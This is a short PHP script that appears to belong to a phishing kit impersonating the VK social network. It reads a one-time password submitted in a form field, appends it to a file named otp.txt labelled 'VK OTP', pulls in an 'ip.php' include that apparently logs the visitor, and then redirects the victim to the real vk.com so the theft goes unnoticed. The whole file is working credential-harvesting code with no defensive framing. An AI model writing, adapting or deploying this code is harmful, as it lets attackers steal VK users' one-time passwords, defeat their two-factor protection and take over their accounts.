<?php
include 'ip.php';
file_put_contents("otp.txt", "VK OTP : " . $pass = $_POST['otp'] . "\n", FILE_APPEND);
header('Location: https://www.vk.com');
?>
